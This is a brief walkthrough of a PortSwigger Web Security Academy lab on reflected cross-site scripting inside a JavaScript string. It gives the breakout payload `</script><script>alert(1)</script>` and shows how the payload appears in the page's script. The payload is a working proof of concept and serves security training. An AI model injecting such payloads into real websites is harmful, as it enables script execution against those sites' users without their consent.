# Reflected XSS into a JavaScript string with single quote and backslash escaped

## This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

## To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

---

### step 1

search something

![screenshot](images/lab21.jpg)

### step2

payload is

```javascript
</script><script>alert(1)</script>
```

enter into search result

```javascript
<script>

var searchTerms = '</script><script>alert(1)</script>';

document.write('<img src="[/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'](https://0a840064042f3b9080d780620032000d.web-security-academy.net/resources/images/tracker.gif?searchTerms=%27+encodeURIComponent(searchTerms)+%27)">');

</script>
```
